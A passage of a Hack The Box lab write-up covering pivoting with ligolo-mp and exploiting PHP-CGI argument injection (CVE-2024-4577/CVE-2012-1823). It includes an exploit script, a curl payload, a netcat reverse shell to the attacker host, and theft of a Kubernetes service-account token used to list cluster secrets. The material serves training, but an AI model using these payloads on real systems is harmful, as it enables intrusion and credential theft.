KUBERNETES_PORT_443_TCP=tcp://10.43.0.1:443
WEB_SERVER_DAEMON_GROUP=daemon
PHP_DEFAULT_POST_MAX_SIZE=80M
WORDPRESS_ENABLE_HTTPS=no
BETA_VINO_WP_WORDPRESS_SERVICE_PORT=80
BETA_VINO_WP_WORDPRESS_SERVICE_PORT_HTTPS=443
WORDPRESS_TABLE_PREFIX=wp_
WORDPRESS_DATABASE_PORT_NUMBER=3306
WORDPRESS_DATABASE_NAME=bitnami_wordpress
LEGACY_INTRANET_SERVICE_SERVICE_PORT_HTTP=5000
APACHE_HTTP_PORT_NUMBER=8080
WP_NGINX_SERVICE_SERVICE_HOST=10.43.4.242
WP_NGINX_SERVICE_PORT=tcp://10.43.4.242:80
WP_CLI_DAEMON_GROUP=daemon
APACHE_DEFAULT_HTTP_PORT_NUMBER=8080
BETA_VINO_WP_MARIADB_PORT=tcp://10.43.147.82:3306
WORDPRESS_MULTISITE_FILEUPLOAD_MAXK=81920
WORDPRESS_AUTO_UPDATE_LEVEL=none
BITNAMI_DEBUG=false
LEGACY_INTRANET_SERVICE_SERVICE_PORT=5000
LEGACY_INTRANET_SERVICE_PORT_5000_TCP_ADDR=10.43.2.241
WORDPRESS_USERNAME=user
BETA_VINO_WP_WORDPRESS_PORT=tcp://10.43.61.204:80
WORDPRESS_ENABLE_XML_RPC=no
WORDPRESS_BLOG_NAME=User's Blog!
WP_NGINX_SERVICE_PORT_80_TCP_ADDR=10.43.4.242
APACHE_PID_FILE=/opt/bitnami/apache/var/run/httpd.pid
WORDPRESS_AUTH_SALT=
APACHE_LOGS_DIR=/opt/bitnami/apache/logs
WORDPRESS_EXTRA_INSTALL_ARGS=
BETA_VINO_WP_MARIADB_PORT_3306_TCP_PORT=3306
APACHE_DAEMON_GROUP=daemon
WORDPRESS_NONCE_KEY=
WEB_SERVER_HTTPS_PORT_NUMBER=8443
WORDPRESS_SMTP_HOST=
WP_NGINX_SERVICE_SERVICE_PORT_HTTP=80
WORDPRESS_NONCE_SALT=
APACHE_DEFAULT_HTTPS_PORT_NUMBER=8443
APACHE_CONF_FILE=/opt/bitnami/apache/conf/httpd.conf
WORDPRESS_MULTISITE_EXTERNAL_HTTP_PORT_NUMBER=80
BETA_VINO_WP_WORDPRESS_PORT_443_TCP=tcp://10.43.61.204:443
WEB_SERVER_DEFAULT_HTTPS_PORT_NUMBER=8443
WP_NGINX_SERVICE_SERVICE_PORT=80
WORDPRESS_LAST_NAME=LastName
WP_NGINX_SERVICE_PORT_80_TCP_PORT=80
WORDPRESS_ENABLE_MULTISITE=no
WORDPRESS_SKIP_BOOTSTRAP=no
WORDPRESS_MULTISITE_EXTERNAL_HTTPS_PORT_NUMBER=443
SHLVL=2
WORDPRESS_SECURE_AUTH_SALT=
BITNAMI_VOLUME_DIR=/bitnami
BETA_VINO_WP_MARIADB_PORT_3306_TCP_ADDR=10.43.147.82
BETA_VINO_WP_WORDPRESS_PORT_80_TCP_PORT=80
KUBERNETES_PORT_443_TCP_PROTO=tcp
BITNAMI_APP_NAME=wordpress
WORDPRESS_DATABASE_PASSWORD=sW5xxxxxxxxxxxxxxxxxxxxx
APACHE_HTDOCS_DIR=/opt/bitnami/apache/htdocs
BETA_VINO_WP_WORDPRESS_SERVICE_HOST=10.43.61.204
WEB_SERVER_GROUP=daemon
WORDPRESS_PASSWORD=O8Fxxxxxxx
KUBERNETES_PORT_443_TCP_ADDR=10.43.0.1
APACHE_HTACCESS_DIR=/opt/bitnami/apache/conf/vhosts/htaccess
WORDPRESS_DEFAULT_DATABASE_HOST=mariadb
WORDPRESS_SECURE_AUTH_KEY=
BETA_VINO_WP_WORDPRESS_PORT_443_TCP_PROTO=tcp
APACHE_TMP_DIR=/opt/bitnami/apache/var/run
APP_VERSION=6.8.1
BETA_VINO_WP_WORDPRESS_PORT_443_TCP_ADDR=10.43.61.204
ALLOW_EMPTY_PASSWORD=yes
WP_CLI_DAEMON_USER=daemon
BETA_VINO_WP_WORDPRESS_SERVICE_PORT_HTTP=80
KUBERNETES_SERVICE_HOST=10.43.0.1
KUBERNETES_PORT=tcp://10.43.0.1:443
KUBERNETES_PORT_443_TCP_PORT=443
WP_CLI_BIN_DIR=/opt/bitnami/wp-cli/bin
WORDPRESS_VERIFY_DATABASE_SSL=yes
OS_NAME=linux
BETA_VINO_WP_WORDPRESS_PORT_80_TCP_PROTO=tcp
APACHE_SERVER_TOKENS=Prod
PATH=/opt/bitnami/apache/bin:/opt/bitnami/common/bin:/opt/bitnami/common/bin:/opt/bitnami/mysql/bin:/opt/bitnami/common/bin:/opt/bitnami/php/bin:/opt/bitnami/php/sbin:/opt/bitnami/apache/bin:/opt/bitnami/mysql/bin:/opt/bitnami/wp-cli/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
LEGACY_INTRANET_SERVICE_PORT_5000_TCP_PROTO=tcp
WORDPRESS_ENABLE_HTACCESS_PERSISTENCE=no
WORDPRESS_ENABLE_REVERSE_PROXY=no
LEGACY_INTRANET_SERVICE_PORT=tcp://10.43.2.241:5000
WORDPRESS_SMTP_USER=
WEB_SERVER_TYPE=apache
WORDPRESS_MULTISITE_HOST=
PHP_DEFAULT_MEMORY_LIMIT=512M
WORDPRESS_OVERRIDE_DATABASE_SETTINGS=no
WORDPRESS_DATABASE_SSL_CA_FILE=
WEB_SERVER_DAEMON_USER=daemon
OS_ARCH=amd64
BETA_VINO_WP_WORDPRESS_PORT_80_TCP_ADDR=10.43.61.204
BETA_VINO_WP_MARIADB_SERVICE_HOST=10.43.147.82
_=/usr/bin/env
```

Here we go, got lots of infos which are WordPress Admin Creds `user:O8Fxxxxxxx` and also Internal Service Discovered which is `LEGACY_INTRANET_SERVICE`, ip `10.43.2.241` and port `5000`. <br>
&rarr; From here we can use different type of pivot like `chisel`, `proxychains` but we gonna use [ligolo-mp](https://github.com/ttpreport/ligolo-mp).

### Pivot
We gonna start up by server side.

```bash
└─$ sudo ligolo-mp server -laddr 0.0.0.0:11601
```

![Giveback Website ligolo-mp](/assets/img/giveback-htb-season9/giveback-htb-season9_website-ligolo-mp.png)

It will appear this interface, just hit `Enter` and `Connect` to Admin.

![Giveback Website ligolo-mp connect](/assets/img/giveback-htb-season9/giveback-htb-season9_website-ligolo-mp-connect.png)

![Giveback Website ligolo-mp connect success](/assets/img/giveback-htb-season9/giveback-htb-season9_website-ligolo-mp-connect-success.png)

After we see this interface, we then `Crtl + N` to create new agent so that this file will be upload via `penelope` to the sessions above.

![Giveback Website ligolo-mp create agent](/assets/img/giveback-htb-season9/giveback-htb-season9_website-ligolo-mp-create-agent.png)

> *If we notice, at the bottom of the interface they show out the key for us to use for different purpose incase we forgot what to press.*

Setting up like the following as this machine is `Linux` and we want to connect back to our kali server so put `10.xx.xx.xx:11601`. <br>
&rarr; Then hit the `Submit` button.

> *Also to move around, we can use `Tab` for easily used.*

![Giveback Website ligolo-mp create agent success](/assets/img/giveback-htb-season9/giveback-htb-season9_website-ligolo-mp-create-agent-success.png)

Our file have been successfully created, now we just rename to `agent` then back to the session and upload it up.

```bash
<-5d8ff4f68c-lwcgm:/opt/bitnami/wordpress/wp-admin$ ^C
[!] Session detached ⇲

(Penelope)─(Session [1])> upload agent
[+] Upload OK /opt/bitnami/wordpress/wp-admin/agent-hfyhynUq
```

> *For my case, it take quite long to upload so be patience :).*

Now we back to the `sessions 1` and execute its client.

```bash
(Penelope)─(Session [1])> sessions 1
[+] Interacting with session [1], Shell Type: Basic, Menu key: Ctrl-C 
[+] Logging to /home/kali/.penelope/beta-vino-wp-wordpress-5d8ff4f68c-lwcgm~10.129.xx.xx-Linux-x86_64/2025_11_03-07_32_07-375.log 📜
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
-rw-rw-r-- 1 1001 1001 23926 Nov  2 10:42 theme-install.php
-rw-rw-r-- 1 1001 1001 49276 Nov  2 10:42 themes.php
-rw-rw-r-- 1 1001 1001  3514 Nov  2 10:42 tools.php
-rw-rw-r-- 1 1001 1001 46519 Nov  2 10:42 update-core.php
-rw-rw-r-- 1 1001 1001 13092 Nov  2 10:42 update.php
-rw-rw-r-- 1 1001 1001   341 Nov  2 10:42 upgrade-functions.php
-rw-rw-r-- 1 1001 1001  6477 Nov  2 10:42 upgrade.php
-rw-rw-r-- 1 1001 1001 15199 Nov  2 10:42 upload.php
drwxrwsr-x 2 1001 1001  4096 Nov  2 10:42 user
-rw-rw-r-- 1 1001 1001 40744 Nov  2 10:42 user-edit.php
-rw-rw-r-- 1 1001 1001 24623 Nov  2 10:42 user-new.php
-rw-rw-r-- 1 1001 1001 23838 Nov  2 10:42 users.php
-rw-rw-r-- 1 1001 1001  5086 Nov  2 10:42 widgets-form-blocks.php
-rw-rw-r-- 1 1001 1001 19625 Nov  2 10:42 widgets-form.php
-rw-rw-r-- 1 1001 1001  1112 Nov  2 10:42 widgets.php
<-5d8ff4f68c-lwcgm:/opt/bitnami/wordpress/wp-admin$ mv agent-hfyhynUq agent
mv agent-hfyhynUq agent
<-5d8ff4f68c-lwcgm:/opt/bitnami/wordpress/wp-admin$ ./agent -connect 10.xx.xx.xx:11601 -ignore-cert
```

![Giveback Website ligolo-mp connection](/assets/img/giveback-htb-season9/giveback-htb-season9_website-ligolo-mp-connection.png)

We can see that we got our connection. <br>
&rarr; Next up we will add route `10.43.2.0/24` so that we can start relay.

![Giveback Website ligolo-mp add route](/assets/img/giveback-htb-season9/giveback-htb-season9_website-ligolo-mp-add-route.png)

> *Push enter on the connection that it will pop up menu for us to choose.*

![Giveback Website ligolo-mp add route info](/assets/img/giveback-htb-season9/giveback-htb-season9_website-ligolo-mp-add-route-info.png)

Hitting `Submit` button then push enter again to `start relay`.

![Giveback Website ligolo-mp start relay](/assets/img/giveback-htb-season9/giveback-htb-season9_website-ligolo-mp-start-relay.png)

Now we can ping the internal service.

```bash
└─$ ping 10.43.2.241                      
PING 10.43.2.241 (10.43.2.241) 56(84) bytes of data.
64 bytes from 10.43.2.241: icmp_seq=1 ttl=64 time=2.17 ms
64 bytes from 10.43.2.241: icmp_seq=2 ttl=64 time=0.474 ms
```

Let's check it out.

![Giveback Website Internal Service](/assets/img/giveback-htb-season9/giveback-htb-season9_website-internal-service.png)

So we saw that is one deployed on Windows IIS using `php-cgi.exe`. <br>
&rarr; Let's checking out cves related and we got [cve-2024-4577](https://nvd.nist.gov/vuln/detail/cve-2024-4577)

### CVE-2024-4577, CVE-2012-1823
Found of the reporter is [Orange Tsai](https://blog.orange.tw/) as one of the popular and extrodinary hacker with lots of incredible exploitations. <br>
Checking out his blog [2024-06-cve-2024-4577-yet-another-php-rce](https://blog.orange.tw/posts/2024-06-cve-2024-4577-yet-another-php-rce/) and found out [PHP RCE: A Bypass of CVE-2012-1823, Argument Injection in PHP-CGI](https://github.com/php/php-src/security/advisories/GHSA-3qgc-jrrr-25jv) which is a bypass of [CVE-2012-1823 - PHP-CGI query string parameter vulnerability](https://bugs.php.net/bug.php?id=61910). <br>
&rarr; In the Github Advisor it also show the desc and poc that we can use to exploit our machine.

```txt
http://server/php-cgi/php-cgi.exe?%add+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input
```

We can also use metasploit to exploit by this articles [cve-2012-1823](https://pentesterlab.com/exercises/cve-2012-1823) from pentesterlab. <br>
And also script to test it out on [exploit-db](https://www.exploit-db.com/exploits/18836). <br>
&rarr; But we need to modified abit cause this one running against python2.

```py
#!/usr/bin/env python3
######################################################################################
# Exploit Title: CVE-2012-1823 PHP CGI Argument Injection Exploit
# Date: May 4, 2012
# Author: rayh4c[0x40]80sec[0x2e]com
# Exploit Discovered by wofeiwo[0x40]80sec[0x2e]com
######################################################################################
import socket
import sys

def cgi_exploit():
    pwn_code = """<?php phpinfo();?>""" 
    post_Length = len(pwn_code)
    http_raw = """POST /?-dallow_url_include%%3don+-dauto_prepend_file%%3dphp://input HTTP/1.1
Host: %s
Content-Type: application/x-www-form-urlencoded
Content-Length: %s

%s
""" % (HOST, post_Length, pwn_code)
    
    print(http_raw)
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((HOST, int(PORT)))
        sock.send(http_raw.encode())
        data = sock.recv(10000)
        print(repr(data))
        sock.close()
    except socket.error as msg:
        sys.stderr.write("[ERROR] %s\n" % str(msg))
        sys.exit(1)
               
if __name__ == '__main__':
    try:
        HOST = sys.argv[1]
        PORT = sys.argv[2]
        cgi_exploit()
    except IndexError:
        print('[+] Usage: python3 cgi_test.py site.com 80')
        sys.exit(-1)
```

```bash
└─$ python3 cgi_test.py 10.43.2.241 5000
POST /?-dallow_url_include%3don+-dauto_prepend_file%3dphp://input HTTP/1.1
Host: 10.43.2.241
Content-Type: application/x-www-form-urlencoded
Content-Length: 18

<?php phpinfo();?>

b'HTTP/1.1 200 OK\r\nServer: nginx/1.24.0\r\nDate: Mon, 03 Nov 2025 13:43:23 GMT\r\nContent-Type: text/html; charset=UTF-8\r\nTransfer-Encoding: chunked\r\nConnection: keep-alive\r\n\r\n814\r\n<!DOCTYPE html>\n<html>\n<head>\n  <title>GiveBack LLC Internal CMS</title>\n  <!-- Developer note: phpinfo accessible via debug mode during migration window -->\n  <style>\n    body { font-family: Arial, sans-serif; margin: 40px; background: #f9f9f9; }\n    .header { color: #333; border-bottom: 1px solid #ccc; padding-bottom: 10px; }\n    .info { background: #eef; padding: 15px; margin: 20px 0; border-radius: 5px; }\n    .warning { background: #fff3cd; border: 1px solid #ffeeba; padding: 10px; margin: 10px 0; }\n    .resources { margin: 20px 0; }\n    .resources li { margin: 5px 0; }\n    a { color: #007bff; text-decoration: none; }\n    a:hover { text-decoration: underline; }\n  </style>\n</head>\n<body>\n  <div class="header">\n    <h1>\xf0\x9f\x8f\xa2 GiveBack LLC Internal CMS System</h1>\n    <p><em>Development Environment \xe2\x80\x93 Internal Use Only</em></p>\n  </div>\n\n  <div class="warning">\n    <h4>\xe2\x9a\xa0\xef\xb8\x8f Legacy Notice</h4>\n    <p>**SRE** - This system still includes legacy CGI support. Cluster misconfiguration may likely expose internal scripts.</p>\n  </div>\n\n  <div class="resources">\n    <h3>Internal Resources</h3>\n    <ul>\n      <li><a href="/admin/">/admin/</a> \xe2\x80\x94 VPN Required</li>\n      <li><a href="/backups/">/backups/</a> \xe2\x80\x94 VPN Required</li>\n      <li><a href="/runbooks/">'
```

Connect that it working but we will do the command via `curl` for easier used. <br>
&rarr; We gonna reverse shell.

```bash
└─$ penelope -p 5555                      
[+] Listening for reverse shells on 0.0.0.0:5555 →  127.0.0.1 • 172.xx.xx.xx • 172.xx.xx.xx • 10.xx.xx.xx
- 🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
```

```bash
└─$ curl "http://10.43.2.241:5000/cgi-bin/php-cgi?%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp://input" -d "busybox nc 10.xx.xx.xx 5555 -e /bin/sh"
```

> *We can use [busybox](https://gtfobins.github.io/gtfobins/busybox/) or just normal `nc`.*.

```bash
└─$ penelope -p 5555                      
[+] Listening for reverse shells on 0.0.0.0:5555 →  127.0.0.1 • 172.xx.xx.xx • 172.xx.xx.xx • 10.xx.xx.xx
- 🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from legacy-intranet-cms-6f7bf5db84-jm6bz~10.129.30.60-Linux-x86_64 😍 Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[!] Python agent cannot be deployed. I need to maintain at least one basic session to handle the PTY
[+] Attempting to spawn a reverse shell on 10.xx.xx.xx:5555
[+] Got reverse shell from legacy-intranet-cms-6f7bf5db84-jm6bz~10.129.30.60-Linux-x86_64 😍 Assigned SessionID <2>
[+] Shell upgraded successfully using /usr/bin/script! 💪
[-] Cannot get the PID of the shell. Response:
False
[-] Cannot get the TTY of the shell. Response:
False
[+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
[+] Logging to /home/kali/.penelope/legacy-intranet-cms-6f7bf5db84-jm6bz~10.129.30.60-Linux-x86_64/2025_11_03-08_58_49-033.log 📜
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
/var/www/html/cgi-bin # ls -la
total 12
drwxr-xr-x    1 root     root          4096 Jul 29 03:08 .
drwxrwxrwt    1 www-data www-data      4096 Jul 29 03:08 ..
-rwxr-xr-x    1 root     root           879 Jul 26 21:53 php-cgi
/var/www/html/cgi-bin # id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
/var/www/html/cgi-bin # whoami
root
```

We got inside root of internal service. <br>
&rarr; Let's check out `env` see if we got something more.

> *This reverse shell one quite take time to run and also sometime it die but not instantly so be sure to re-run to got reverse shell again and continue the proccess :>.*

```bash
/var/www/html/cgi-bin # env
KUBERNETES_SERVICE_PORT=443
KUBERNETES_PORT=tcp://10.43.0.1:443
HOSTNAME=legacy-intranet-cms-6f7bf5db84-jm6bz
PHP_INI_DIR=/usr/local/etc/php
BETA_VINO_WP_WORDPRESS_SERVICE_PORT=80
BETA_VINO_WP_WORDPRESS_PORT=tcp://10.43.61.204:80
WP_NGINX_SERVICE_PORT=tcp://10.43.4.242:80
WP_NGINX_SERVICE_SERVICE_PORT=80
LEGACY_INTRANET_SERVICE_SERVICE_HOST=10.43.2.241
SHLVL=5
PHP_CGI_VERSION=8.3.3
LEGACY_INTRANET_SERVICE_PORT_5000_TCP=tcp://10.43.2.241:5000
HOME=/root
PHP_LDFLAGS=-Wl,-O1 -pie
LEGACY_CGI_ENABLED=true
BETA_VINO_WP_WORDPRESS_PORT_80_TCP_ADDR=10.43.61.204
BETA_VINO_WP_MARIADB_PORT_3306_TCP_ADDR=10.43.147.82
PHP_CFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64
WP_NGINX_SERVICE_PORT_80_TCP_ADDR=10.43.4.242
PHP_VERSION=8.3.3
LEGACY_INTRANET_SERVICE_SERVICE_PORT=5000
LEGACY_INTRANET_SERVICE_PORT=tcp://10.43.2.241:5000
LEGACY_MODE=enabled
BETA_VINO_WP_WORDPRESS_PORT_80_TCP_PORT=80
BETA_VINO_WP_MARIADB_PORT_3306_TCP_PORT=3306
GPG_KEYS=1198C0117593497A5EC5C199286AF1F9897469DC C28D937575603EB4ABB725861C0779DC5C0A9DE4 AFD8691FDAEDF03BDF6E460563F15A9B715376CA
BETA_VINO_WP_WORDPRESS_PORT_80_TCP_PROTO=tcp
BETA_VINO_WP_MARIADB_PORT_3306_TCP_PROTO=tcp
WP_NGINX_SERVICE_PORT_80_TCP_PORT=80
BETA_VINO_WP_MARIADB_SERVICE_HOST=10.43.147.82
PHP_CPPFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64
PHP_ASC_URL=https://www.php.net/distributions/php-8.3.3.tar.xz.asc
WP_NGINX_SERVICE_PORT_80_TCP_PROTO=tcp
BETA_VINO_WP_MARIADB_SERVICE_PORT_MYSQL=3306
PHP_URL=https://www.php.net/distributions/php-8.3.3.tar.xz
TERM=xterm-256color
PHP_MAX_EXECUTION_TIME=120
KUBERNETES_PORT_443_TCP_ADDR=10.43.0.1
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
BETA_VINO_WP_MARIADB_SERVICE_PORT=3306
BETA_VINO_WP_MARIADB_PORT=tcp://10.43.147.82:3306
BETA_VINO_WP_WORDPRESS_PORT_80_TCP=tcp://10.43.61.204:80
BETA_VINO_WP_WORDPRESS_PORT_443_TCP_ADDR=10.43.61.204
KUBERNETES_PORT_443_TCP_PORT=443
BETA_VINO_WP_MARIADB_PORT_3306_TCP=tcp://10.43.147.82:3306
PHP_MEMORY_LIMIT=128M
KUBERNETES_PORT_443_TCP_PROTO=tcp
WP_NGINX_SERVICE_PORT_80_TCP=tcp://10.43.4.242:80
CMS_ENVIRONMENT=development
BETA_VINO_WP_WORDPRESS_PORT_443_TCP_PORT=443
BETA_VINO_WP_WORDPRESS_PORT_443_TCP_PROTO=tcp
SHELL=/bin/sh
BETA_VINO_WP_WORDPRESS_SERVICE_PORT_HTTP=80
WP_NGINX_SERVICE_SERVICE_PORT_HTTP=80
KUBERNETES_PORT_443_TCP=tcp://10.43.0.1:443
KUBERNETES_SERVICE_PORT_HTTPS=443
PHPIZE_DEPS=autoconf            dpkg-dev dpkg           file            g++             gcc             libc-dev                make            pkgconf                 re2c
KUBERNETES_SERVICE_HOST=10.43.0.1
LEGACY_INTRANET_SERVICE_PORT_5000_TCP_ADDR=10.43.2.241
PWD=/var/www/html/cgi-bin
PHP_SHA256=b0a996276fe21fe9ca8f993314c8bc02750f464c7b0343f056fb0894a8dfa9d1
BETA_VINO_WP_WORDPRESS_SERVICE_PORT_HTTPS=443
BETA_VINO_WP_WORDPRESS_PORT_443_TCP=tcp://10.43.61.204:443
LEGACY_INTRANET_SERVICE_PORT_5000_TCP_PORT=5000
BETA_VINO_WP_WORDPRESS_SERVICE_HOST=10.43.61.204
WP_NGINX_SERVICE_SERVICE_HOST=10.43.4.242
LEGACY_INTRANET_SERVICE_SERVICE_PORT_HTTP=5000
LEGACY_INTRANET_SERVICE_PORT_5000_TCP_PROTO=tcp
```

From these output, we saw kubernet service.

```bash
KUBERNETES_SERVICE_PORT=443
KUBERNETES_PORT=tcp://10.43.0.1:443
KUBERNETES_SERVICE_HOST=10.43.0.1
HOSTNAME=legacy-intranet-cms-6f7bf5db84-jm6bz
```

Meaning that we are in K8s so therefore we need to check for K8s service account and also enumerate K8s as well.

### Kubernetes
From that poding name, we searching for docs and found out [access-api-from-pod](https://kubernetes.io/docs/tasks/run-application/access-api-from-pod/) articles which we can [accessing-the-api-from-within-a-pod](https://kubernetes.io/docs/tasks/run-application/access-api-from-pod/#accessing-the-api-from-within-a-pod) if we have those following things.

**Which are:** <br>
- token (JWT for API auth).
- ca.crt (Certificate authority).
- namespace (Current namespace).

Let's explore them out.

```bash
cd /var/run/secrets/kubernetes.io/serviceaccount
ls -la
total 4
drwxrwxrwt    3 root     root           140 Nov  5 03:02 .
drwxr-xr-x    3 root     root          4096 Nov  5 00:42 ..
drwxr-xr-x    2 root     root           100 Nov  5 03:02 ..2025_11_05_03_02_14.3758450528
lrwxrwxrwx    1 root     root            32 Nov  5 03:02 ..data -> ..2025_11_05_03_02_14.3758450528
lrwxrwxrwx    1 root     root            13 Nov  4 05:09 ca.crt -> ..data/ca.crt
lrwxrwxrwx    1 root     root            16 Nov  4 05:09 namespace -> ..data/namespace
lrwxrwxrwx    1 root     root            12 Nov  4 05:09 token -> ..data/token
```

> *Every pod has service account mounted at `/var/run/secrets/kubernetes.io/serviceaccount`.*

```bash
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace
default
cat /var/run/secrets/kubernetes.io/serviceaccount/token
eyJhbGciOiJSUzI1NiIsImtpZCI6Inp3THEyYUhkb19sV3VBcGFfdTBQa1c1S041TkNiRXpYRS11S0JqMlJYWjAifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiLCJrM3MiXSwiZXhwIjoxNzkzODQ3ODQ3LCJpYXQiOjE3NjIzMTE4NDcsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwianRpIjoiZGJkNmY2NDEtMWUzOC00M2JhLThmNzEtZjg0YTkwYzRjY2I2Iiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0Iiwibm9kZSI6eyJuYW1lIjoiZ2l2ZWJhY2suaHRiIiwidWlkIjoiMTJhOGE5Y2YtYzM1Yi00MWYzLWIzNWEtNDJjMjYyZTQzMDQ2In0sInBvZCI6eyJuYW1lIjoibGVnYWN5LWludHJhbmV0LWNtcy02ZjdiZjVkYjg0LXpjeDg4IiwidWlkIjoiNjEyYmJmZjMtOTQ3NS00ZGVmLTg2MjQtNTI1ODI4MzAwNDAzIn0sInNlcnZpY2VhY2NvdW50Ijp7Im5hbWUiOiJzZWNyZXQtcmVhZGVyLXNhIiwidWlkIjoiNzJjM2YwYTUtOWIwOC00MzhhLWEzMDctYjYwODc0NjM1YTlhIn0sIndhcm5hZnRlciI6MTc2MjMxNTQ1NH0sIm5iZiI6MTc2MjMxMTg0Nywic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50OmRlZmF1bHQ6c2VjcmV0LXJlYWRlci1zYSJ9.dDbXKIDsEnfR_dPoimtDZkpqvOhgll6XPrZUZA1LVC-E59d-CmoUirnPKmRdGhy8n_xe4BCsNheFNmccNV5Xt-4c3hnyhZFAqglGppY9r7SXNY01a2-s31UtYePImfClunzgeYJu9ni_7YlYKEbmWdCAIBPhISIaXuxfzUvAG7-GBnXpvSlm71WuPp1YOeVZ-9ZsXvokqfqZIwJHa2ijRH3oLpIKWPOqkqc91t5aop4jRjByrveuPCDjrVG9-VW2lpNhWqmSyvrYlclqiJW20wQBWlhWHnX3OdYZfk8ge3C0F0i7UzU7-2wc18ic5LJzxaDE67Ebxk-2vP7iVTOahg
cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt
-----BEGIN CERTIFICATE-----
MIIBdzCCAR2gAwIBAgIBADAKBggqhkjOPQQDAjAjMSEwHwYDVQQDDBhrM3Mtc2Vy
dmVyLWNhQDE3MjY5Mjc3MjMwHhcNMjQwOTIxMTQwODQzWhcNMzQwOTE5MTQwODQz
WjAjMSEwHwYDVQQDDBhrM3Mtc2VydmVyLWNhQDE3MjY5Mjc3MjMwWTATBgcqhkjO
PQIBBggqhkjOPQMBBwNCAATWYWOnIUmDn8DGHOdKLjrOZ36gSUMVrnqqf6YJsvpk
9QbgzGNFzYcwDZxmZtJayTbUrFFjgSydDNGuW/AkEnQ+o0IwQDAOBgNVHQ8BAf8E
BAMCAqQwDwYDVR0TAQH/BAUwAwEB/zAdBgNVHQ4EFgQUtCpVDbK3XnBv3N3BKuXy
Yd0zeicwCgYIKoZIzj0EAwIDSAAwRQIgOsFo4UipeXPiEXvlGH06fja8k46ytB45
cd0d39uShuQCIQDMgaSW8nrpMfNExuGLMZhcsVrUr5XXN8F5b/zYi5snkQ==
-----END CERTIFICATE-----
```

For easier used, we will convert the `ca.crt` to base64.

```bash
cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt | base64 -w0
LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSUJkekNDQVIyZ0F3SUJBZ0lCQURBS0JnZ3Foa2pPUFFRREFqQWpNU0V3SHdZRFZRUUREQmhyTTNNdGMyVnkKZG1WeUxXTmhRREUzTWpZNU1qYzNNak13SGhjTk1qUXdPVEl4TVRRd09EUXpXaGNOTXpRd09URTVNVFF3T0RRegpXakFqTVNFd0h3WURWUVFEREJock0zTXRjMlZ5ZG1WeUxXTmhRREUzTWpZNU1qYzNNak13V1RBVEJnY3Foa2pPClBRSUJCZ2dxaGtqT1BRTUJCd05DQUFUV1lXT25JVW1EbjhER0hPZEtManJPWjM2Z1NVTVZybnFxZjZZSnN2cGsKOVFiZ3pHTkZ6WWN3RFp4bVp0SmF5VGJVckZGamdTeWRETkd1Vy9Ba0VuUStvMEl3UURBT0JnTlZIUThCQWY4RQpCQU1DQXFRd0R3WURWUjBUQVFIL0JBVXdBd0VCL3pBZEJnTlZIUTRFRmdRVXRDcFZEYkszWG5CdjNOM0JLdVh5CllkMHplaWN3Q2dZSUtvWkl6ajBFQXdJRFNBQXdSUUlnT3NGbzRVaXBlWFBpRVh2bEdIMDZmamE4azQ2eXRCNDUKY2QwZDM5dVNodVFDSVFETWdhU1c4bnJwTWZORXh1R0xNWmhjc1ZyVXI1WFhOOEY1Yi96WWk1c25rUT09Ci0tLS0tRU5EIENFUlRJRklDQVRFLS0tLS0K
```

We can use this these to gather the [secret](https://kubernetes.io/docs/concepts/configuration/secret/) that can exposing lots of info for us.

```bash
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
```

```bash
curl -sk -H "Authorization: Bearer $TOKEN" \
  https://10.43.0.1:443/api/v1/namespaces/default/secrets
{
  "kind": "SecretList",
  "apiVersion": "v1",
  "metadata": {
    "resourceVersion": "2862242"
  },
  "items": [
    {
      "metadata": {
        "name": "beta-vino-wp-mariadb",
        "namespace": "default",
        "uid": "3473d5ec-b774-40c9-a249-81d51426a45e",
        "resourceVersion": "2088227",
        "creationTimestamp": "2024-09-21T22:17:31Z",
        "labels": {
          "app.kubernetes.io/instance": "beta-vino-wp",
          "app.kubernetes.io/managed-by": "Helm",
          "app.kubernetes.io/name": "mariadb",
          "app.kubernetes.io/part-of": "mariadb",
          "app.kubernetes.io/version": "11.8.2",
          "helm.sh/chart": "mariadb-21.0.0"
        },
        "annotations": {
          "meta.helm.sh/release-name": "beta-vino-wp",
          "meta.helm.sh/release-namespace": "default"
        },
        "managedFields": [
          {
            "manager": "helm",
            "operation": "Update",
            "apiVersion": "v1",
            "time": "2025-08-29T03:29:54Z",
            "fieldsType": "FieldsV1",
            "fieldsV1": {
              "f:data": {
                ".": {},
                "f:mariadb-password": {},
                "f:mariadb-root-password": {}
              },
              "f:metadata": {
                "f:annotations": {
                  ".": {},
